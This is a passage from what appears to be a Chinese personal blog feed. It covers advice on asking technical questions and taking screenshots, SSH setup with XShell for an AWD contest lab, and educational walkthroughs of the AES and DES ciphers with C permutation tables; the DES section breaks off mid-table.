不要在实际步骤上开玩笑，那样也许会毁了提问者的设置 —— 有些可怜的萌新会把它当成真的指令。</p><p><strong>试探性的反问以引出更多的细节。</strong> 如果你做得好，提问者可以学到点东西 —— 你也可以。试试将蠢问题转变成好问题，别忘了我们都曾是新手。</p><p>尽管对那些懒虫抱怨一声 RTFM(Read The Fucking Manual) 是正当的，但能给出文档的链接（即使只是建议个 Google 搜索关键词）会更好。</p><p><strong>如果你决定回答，就请给出好的答案。</strong> 当别人正在用错误的工具或方法时别建议笨拙的权宜之计（workaround），应推荐更好的工具，重新界定问题。</p><p><strong>正面地回答问题！</strong> 如果这个提问者已经很深入的研究而且也表明已经试过 X 、 Y 、 Z 、 A 、 B 、 C 但没得到结果，回答 <code>试试看 A 或是 B</code> 或者 <code>试试 X 、 Y 、 Z 、 A 、 B 、 C</code> 并附上一个链接一点用都没有。</p><p><strong>帮助你的社区从问题中学习。</strong> 当回复一个好问题时，问问自己<code>如何修改相关文件或常见问题文件以免再次解答同样的问题？</code>，接着再向文件维护者发一份补丁。</p><p>如果你在研究一番后才作出了回答，<code>展现你的技巧而不是直接端出结果</code>。毕竟<code>授人以鱼不如授人以渔</code>。</p><h1 id="截图而不是拍照">截图而不是拍照</h1><p>群聊中经常有提问者认为有人帮助他们代表着也愿意去费力分析自己提供的模糊不堪的照片.</p><p>一旦你使用类似这些回复:</p><p><code>我觉得不模糊啊</code>,<code>但是照片清楚不清楚和我的问题有什么关系</code>,<code>我的电脑没有装xxx,不方便截图</code></p><p>你很有可能被视作小丑而被忽略甚至挨骂.</p><p>记住,你能不能提供清晰的截图和信息<code>是你自己的事情</code>,提问者只是从百忙之中抽出空闲时间无偿地提供帮助,没有任何义务去迁就你.</p><p>好用的截图工具有这些:</p><p>windows下:</p><ul><li>微信/QQ截图,自行设置快捷键,一般为<code>ctrl+alt+A</code></li><li>PixPin,一个新软件,十分方便的截图工具</li><li>Windows自带的截图工具<code>Win+shift+S</code>,<code>Alt+PtrSc</code></li><li>注意使用<code>ctrl+v</code>来粘贴截图</li></ul>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提问的艺术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWD比赛学习</title>
      <link href="/2023-12-16-8e82fffcfbec/"/>
      <url>/2023-12-16-8e82fffcfbec/</url>
      
        <content type="html"><![CDATA[<h1 id="使用xshell进行ssh连接">使用XShell进行SSH连接</h1><h2 id="linux虚拟机配置">linux虚拟机配置</h2><p>使用VMware16上的ubuntu22进行测试.</p><p>ubuntu配置为NAT模式连接,启动后终端内<code>ping baidu.com</code>检查连接,然后<code>ipconfig</code>命令检查<code>ens33</code>网卡的ip地址:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231216094701892.png" alt="image-20231216094701892" style="zoom:50%;" /><p>然后在win中cmd尝试ping该ip,检查连通性:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231216094922622.png" alt="image-20231216094922622" style="zoom:50%;" /><p>然后就可以开启linux的ssh服务:</p><p>首先<code>sudo apt install openssh-server</code>安装SSH.</p><p>然后<code>service  ssh start</code>启动SSH服务即可.</p><p>接着在win下使用XShell(直接安装注册免费账号)连接:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231216095204170.png" alt="image-20231216095204170" style="zoom: 33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231216095256368.png" alt="image-20231216095256368" style="zoom: 33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231216095332049.png" alt="image-20231216095332049" style="zoom:33%;" /><p>这样即可,然后点击连接会弹出警告,继续即可,然后输入linux中的账号密码(可以保存),就可以连接上了:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231216095516494.png" alt="image-20231216095516494" style="zoom: 33%;" />]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AES</title>
      <link href="/2023-12-14-0f0bc19fd9a1/"/>
      <url>/2023-12-14-0f0bc19fd9a1/</url>
      
        <content type="html"><![CDATA[<h1 id="aes概述">AES概述</h1><p>AES(Advanced Encryption Standard)是一种<code>对称密钥</code>的<code>分组加密</code>算法.</p><p>不同于它的前任标准DES，Rijndael使用的是<a href="https://zh.wikipedia.org/wiki/%E4%BB%A3%E6%8D%A2-%E7%BD%AE%E6%8D%A2%E7%BD%91%E7%BB%9C">代换-置换网络</a>，而非<a href="https://zh.wikipedia.org/wiki/Feistel%E6%9E%B6%E6%9E%84">Feistel架构</a>.</p><p>AES分组固定为128bit,即16byte.而密钥长度可以为128bit,192bit或256bit.不同长度的密钥,推荐加密轮次也不同.</p><p>与DES不同,AES维护一个状态矩阵,所有加密轮次结束后,状态矩阵内容即为密文.</p><p>下面描述AES-128.</p><h1 id="aes基本结构">AES基本结构</h1><h2 id="加密轮次">加密轮次</h2><p>作为分组密码,AES的每个分组长度固定,而对于不同长度密钥,有着不同的推荐加密轮次(轮函数的执行次数),如下所示:</p><table><thead><tr><th style="text-align:center">AES</th><th style="text-align:center">密钥长度/字(32bit为1个字)</th><th style="text-align:center">分组长度/字(32bit为1个字)</th><th style="text-align:center">加密轮次</th></tr></thead><tbody><tr><td style="text-align:center">AES-128</td><td style="text-align:center">4</td><td style="text-align:center">4</td><td style="text-align:center">10</td></tr><tr><td style="text-align:center">AES-192</td><td style="text-align:center">6</td><td style="text-align:center">4</td><td style="text-align:center">12</td></tr><tr><td style="text-align:center">AES-256</td><td style="text-align:center">8</td><td style="text-align:center">4</td><td style="text-align:center">14</td></tr></tbody></table><h2 id="加密的结构">加密的结构</h2><p>AES在一个4x4的矩阵上运行,每个元素都是1byte,一共16byte,即一个128bit的分组.</p><p>初始时,这个矩阵内容即为当前分组的明文,填充进这个<code>状态矩阵</code>,顺序从上到下,从做到用,如下所示:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214152521877.png" alt="image-20231214152521877" style="zoom:50%;" /><p>每轮加密都是对这个状态矩阵进行几步运算,其中涉及到置换,异或,矩阵乘法等.</p><h2 id="密钥的处理">密钥的处理</h2><p>128位密钥也是以矩阵的形式来处理.需要对其进行扩展,最终扩展为44个字,其中前4个字位初始密钥,后40个字每10个一组依次用于10轮加密.</p><p>首先初始密钥也存储在一个4x4的矩阵:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214152734850.png" alt="image-20231214152734850" style="zoom:50%;" /><p>然后每一列的4个字节(byte)合成一个字(word):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214152908328.png" alt="image-20231214152908328" style="zoom:50%;" /><p>即<code>W0</code>为<code>K0K1K2K3</code>拼接而成.</p><p>接着根据如下规则产生后面的<code>W4</code>-<code>W43</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214153611764.png" alt="image-20231214153611764" style="zoom:50%;" /><ol><li>如果i不是4的倍数,则 <code>W[i] = W[i-4] xor W[i-1]</code></li><li>如果i是4的倍数,则 <code>W[i] = W[i-4] xor T(W[i-1])</code></li></ol><p>其中T()为:</p><p>a. 将4个字节进行<code>循环左旋</code>1个字节.</p><p>b. 然后使用<code>S盒</code>(AES定义的,后面给出)进行变换</p><p>c. 然后与<code>轮常量</code>Rcon[j]异或(图中的<code>j</code>为<code>i/4</code>):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214154248868.png" alt="image-20231214154248868" style="zoom:50%;" /></p><h2 id="aes的s盒和逆s盒">AES的S盒和逆S盒</h2><p>AES的S盒定义如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214160148556.png" alt="image-20231214160148556" style="zoom:50%;" /><p>逆S盒:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214160426437.png" alt="image-20231214160426437" style="zoom:50%;" /><p>查找时,将输入字节的高4位作为行,低4位作为列进行查找.</p><h2 id="行移位">行移位</h2><p>行移位是一个简单的左循环操作,第0行左移0位(即不移位),第1行左移1位,第2行左移2位,第3行左移3位.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214160647204.png" alt="image-20231214160647204" style="zoom:50%;" /><p>其逆变换即为反向的移位.</p><h2 id="列混合">列混合</h2><p>列混合是一个矩阵乘法,有一个固定的矩阵:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214160746412.png" alt="image-20231214160746412" style="zoom:50%;" /><p>逆列混合同理:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214160803810.png" alt="image-20231214160803810" style="zoom:50%;" /><p>可以验证两个矩阵<code>互逆</code>.</p><h2 id="轮密钥加">轮密钥加</h2><p>轮密钥加实际上就是<code>逐位异或</code>.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214160948716.png" alt="image-20231214160948716" style="zoom:50%;" /><h1 id="aes的加解密操作">AES的加解密操作</h1><p>过程如下图:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214161107048.png" alt="image-20231214161107048" style="zoom:50%;" /><p>其中的<code>字节代换</code>就是查询S盒的操作,将一个字节输入S盒,输出结果就是查S盒表的结果.<code>逆字节代换</code>同理,使用逆S盒.</p><p>每一轮都使用扩展的对应的四字密钥.</p><p>另外,在第一轮迭代之前,先将明文和原始密钥进行一次异或加密操作.</p><br><p>参考:<a href="https://blog.csdn.net/qq_28205153/article/details/55798628">https://blog.csdn.net/qq_28205153/article/details/55798628</a></p>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES</title>
      <link href="/2023-12-13-f76861fd03aa/"/>
      <url>/2023-12-13-f76861fd03aa/</url>
      
        <content type="html"><![CDATA[<h1 id="des概述">DES概述</h1><p>DES(Data Encryption Standard)是一种<code>对称密钥</code>的<code>分组加密</code>算法.</p><p>DES使用同一个长为64位(实际只有56位)的密钥进行加密和解密.</p><p>其分组为64位(8个字节),如果加密的数据不是64位的倍数,则按照某种规则进行填充.</p><p>到目前为止,DES已经不是一种安全的加密方法,主要因为它使用的56位密钥过短,现在已经逐渐被<code>AES</code>所取代.</p><br><p>DES算法将明文进行一系列的排列和替换来实现加密,关键过程为使用原始密钥来生成16个密钥,然后分别使用这16个密钥对数据依次进行一系列的位操作,一共进行16次,最终得到密文.解密相同,只不过反向(密钥使用顺序颠倒)进行操作.</p><h1 id="des加密流程">DES加密流程</h1><p>加密流程图(来自维基百科):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231213152749279.png" alt="image-20231213152749279" style="zoom:50%;" /><p>在核心加密之前需要执行一个<code>密钥调度</code>,即根据<code>原始密钥</code>生成16个48位的<code>子密钥</code>用于后续操作.</p><p>开始加密之前,先对明文进行一次置换,其中<code>IP</code>和<code>FP</code>为一对互逆的置换,即FP为IP的<code>反函数</code>.IP用于将明文<code>Plaintext</code>先进行一次换位处理,打乱原来的顺序,得到一个乱序的明文组,然后再进行核心的加密.</p><p>将64位明文组分成2部分,各为32位,并被交叉地分别处理,这种交叉结构被称为<code>费斯妥结构</code>,其保证了加密和解密过程足够相似,有利于电路/代码的实现.</p><p>接着就是<code>F函数</code>,这个函数即为DES的核心,使用生成好的48位<code>子密钥</code>对32位的数据进行操作,完成1次加密操作,一共有16次.</p><h2 id="初始置换ip">初始置换IP</h2><p>IP根据一个IP置换表进行换位:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231213011719278.png" alt="image-20231213011719278" style="zoom:50%;" /><p>也就是说,原来的64位明文为M0,置换后的明文为M1,</p><p>将M0的第58位换到M1的第1位,M0的第50位换到M1的第2位……以此类推.</p><p>置换完成后,将M1前后分成2块<code>L0</code>和<code>R0</code>,各为32位.</p><h2 id="密钥调度">密钥调度</h2><p>密钥调度即子密钥的生成.</p><p>DES根据初始的64位密钥来生成16个不同的子密钥,原来64位中有56位是有效位,其余8位(根据PC-1置换表)被用于<code>奇偶校验</code>,并最后被舍弃.</p><p>密钥调度流程图(来自维基百科):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231213152722041.png" alt="image-20231213152722041" style="zoom:50%;" /><h3 id="pc-1置换选取56位块">PC-1置换选取56位块</h3><p>首先将64位原始密钥使用<code>PC-1置换表</code>进行换位,并分成2组,该表只指定了56位,剩下的第8,16,24,32,40,48,56,64位共8位被舍弃.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PC-1置换表,因为无图所以用代码表示了</span></span><br><span class="line"><span class="type">int</span> pc1_l[<span class="number">28</span>] = &#123;</span><br><span class="line">    <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">    <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">    <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> pc1_r[<span class="number">28</span>] = &#123;</span><br><span class="line">    <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">    <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">    <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">    <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样就将64位原始密钥拆分成了2个28位的部分<code>C0</code>和<code>D0</code>.</p><h3 id="生成16个块ci-di-i-1-16">生成16个块Ci,Di(i=1-16)</h3><p>接下来根据公式</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>n</mi></msub><mo>=</mo><mi>r</mi><mi>o</mi><mi>t</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>C</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>r</mi><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>D</mi><mi>n</mi></msub><mo>=</mo><mi>r</mi><mi>o</mi><mi>t</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>D</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>r</mi><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C_n=rotate(C_0,r[n])\\D_n=rotate(D_0,r[n])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathdefault">n</span><span class="mclose">]</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathdefault">n</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span></span></p><p>进行<code>循环左旋</code>生成16个块Ci,Di(每个块都有一对Ci和Di)</p><p>其中左旋位数由<code>r[]</code>指定,<code>r[]</code>固定如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第0位无意义</span></span><br><span class="line"><span class="type">int</span> r[<span class="number">17</span>]=&#123;<span class="number">-1</span>,<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure><p>例如有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C0：<span class="number">1111000011001100101010101111</span></span><br><span class="line">D0：<span class="number">0101010101100110011110001111</span></span><br><span class="line"></span><br><span class="line">生成C1时,n=<span class="number">1</span>,则r[<span class="number">1</span>]==<span class="number">1</span>,循环左移<span class="number">1</span>位得:</span><br><span class="line"></span><br><span class="line">C1：<span class="number">1110000110011001010101011111</span></span><br><span class="line">D1：<span class="number">1010101011001100111100011110</span></span><br></pre></td></tr></table></figure><h3 id="生成16个子密钥k">生成16个子密钥K</h3><p>然后根据公式</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>n</mi></msub><mo>=</mo><mi>P</mi><msub><mi>C</mi><mn>2</mn></msub><mo stretchy="false">(</mo><msub><mi>C</mi><mi>n</mi></msub><msub><mi>D</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K_n = PC_2(C_nD_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>进行Ki(i=1-&gt;16)的生成,<code>CnDn</code>代表将Cn和Dn连接在一起.</p><p>其中PC2代表使用<code>PC-2置换表</code>进行换位,从<code>CiDi</code>中选取48位作为最终的密钥Ki.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PC-2置换表,因为无图所以用代码表示了</span></span><br><span class="line"><span class="type">int</span> pc2[<span class="number">48</span>] = &#123;</span><br><span class="line">            <span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line">            <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">            <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">            <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>,</span><br><span class="line">            <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">            <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>,</span><br><span class="line">            <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最终生成的16个48位比特串(块)Ki(i=1-16)即为16个子密钥,用于后续的加密.</p><h2 id="轮函数加密">轮函数加密</h2><p>流程仍然是这个图:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231213152749279.png" style="zoom:50%;" /><p>说白了就是在每一轮中将2块数据交替地进行<code>F()处理</code>,然后将处理后的值与本轮中另一个块进行异或.</p><h3 id="f函数">F函数</h3><p><img src="https://www.ruanx.net/content/images/2020/04/image-2.png" alt="img"></p><p>F函数将一个32bit的<code>(半)块</code>进行一次<code>E置换</code>,置换时进行了<code>扩张</code>,生成48bit的块,然后与48位的<code>子密钥K</code>进行<code>异或</code>,得到的48bit的结果再分成8组,每组为6bit,经过<code>S盒</code>,每组生成4bit的结果,组合起来一共为4*8==32bit的结果,然后再进行一次<code>P置换</code>,即为F函数的最终结果.</p><p>最终的结果仍然为32bit,与输入的32bit块大小一样,准备用于下一步加密.</p><h4 id="e置换">E置换</h4><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231213160234680.png" alt="image-20231213160234680" style="zoom:50%;" /><p>通过该表进行32bit -&gt; 48bit的扩张.</p><h4 id="异或">异或</h4><p>即将<code>E置换</code>后的48位扩张结果与子密钥K进行异或.</p><h4 id="s盒代换">S盒代换</h4><p>将异或结果分成6bit一组,共8组.经过S盒后,6位变为4位.</p><p>S盒代换有8个盒子(S-Box),分别对应8个组,通过查找表进行代换.</p><p>图片来源于<a href="https://www.cnblogs.com/idreamo/p/9333753.html">这篇文章</a>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1281268-20180721091109996-1317544123.png" alt="img" style="zoom: 80%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1281268-20180721091122027-316945059.png" alt="img" style="zoom:79%;" /><p>每一组查找到的数转为4位二进制数即为输出的4bit结果.</p><h4 id="p置换">P置换</h4><p>P为固定置换,将经过S盒变换得到的32bit进行一个置换操作.</p><p>需要注意一点:这个P置换是精心设计的,使得这一轮同一个S盒输出的四个bit,在下一回合的扩张之后,交由四个不同的S盒去处理.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// P置换表,因为无图所以用代码表示了</span></span><br><span class="line"><span class="type">int</span> P[<span class="number">32</span>]=&#123;</span><br><span class="line">    <span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">    <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,</span><br><span class="line">    <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">    <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>,</span><br><span class="line">    <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">    <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>,</span><br><span class="line">    <span 